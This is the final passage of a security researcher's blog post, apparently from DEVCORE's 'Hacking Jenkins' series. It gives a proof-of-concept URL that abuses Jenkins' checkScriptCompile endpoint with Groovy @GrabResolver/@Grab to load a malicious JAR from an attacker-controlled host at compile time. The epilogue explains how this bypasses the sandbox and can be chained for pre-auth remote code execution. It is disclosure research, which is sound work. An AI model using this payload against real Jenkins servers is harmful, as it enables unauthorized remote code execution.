<span class="nv">$ </span>curl <span class="nt">-I</span> http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
</code></pre></div></div>

<p>PoC:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='orange.tw', root='http://[your_host]/')%0a
@Grab(group='tw.orange', module='poc', version='1')%0a
import Orange;
</code></pre></div></div>

<p>Video:</p>

<center><div class="videowrapper"><iframe width="560" height="420" src="https://www.youtube.com/embed/abuH-j-6-s0" frameborder="0"> </iframe></div></center>

<p><br /></p>

<h2 id="epilogue">Epilogue</h2>
<hr />

<p>With the exploit, we can gain full access on remote Jenkins server! We use Meta-Programming to import malicious JAR file during compile-time, and executing arbitrary code by the Runner service! Although there is a built-in Groovy Sandbox(<a href="https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin">Script Security Plugin</a>) on Jenkins to protect the Pipeline, it’s useless because the vulnerability is in compile-time, not in run-time!</p>

<p>Because this is an attack vector on Groovy core, all methods related to the Groovy parser are affected!  It breaks the developer’s thought which there is no execution so there is no problem. It is also an attack vector that requires the knowledge about computer science. Otherwise, you cannot think of the Meta-Programming! That’s what makes this vulnerability interesting. Aside from entry points <code class="highlighter-rouge">doCheckScriptCompile(...)</code> and <code class="highlighter-rouge">toJson(...)</code> I reported, after the vulnerability has been fixed, <a href="https://twitter.com/0ang3el">Mikhail Egorov</a> also found another <a href="https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292">entry point</a> quickly to trigger this vulnerability!</p>

<p>Apart from that, this vulnerability can also be chained with my previous exploit on <a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">Hacking Jenkins Part 1</a> to bypass the Overall/Read restriction to a well-deserved pre-auth remote code execution. If you fully understand the article, you know how to chain :P</p>

<p>Thank you for reading this article and hope you like it! Here is the end of Hacking Jenkins series, I will publish more interesting researches in the future :)</p>


              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="blog-author-name">Orange Tsai</a> 
              </div>
              <p class="blog-author-info">
                I am Orange : )
              </p>
          
              <div class="heading--side-lined">
                Comments
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">


        <div class="contact-section container">
          <h2 class="contact-section__title">
            Put your defenses to the test with authentic attacks
          </h2>
          <a href="/en/contact/" class="home-contact__button button--dense">Contact us now</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            DEVCORE offers professional<br class="mobile-only" /><a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services.<br />For <a href="/en/blog/" class="link">latest updates</a>, follow us on <a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a> or <a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>.
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                10F., No.168, Fuxing N. Rd., Zhongshan Dist., Taipei City 10487, Taiwan (R.O.C.)
              </li>
              <li>
                contact@devco.re
              </li>
              <li>
                +886-2-2718-0156
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2021 DEVCORE</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>





  </body>
</html>




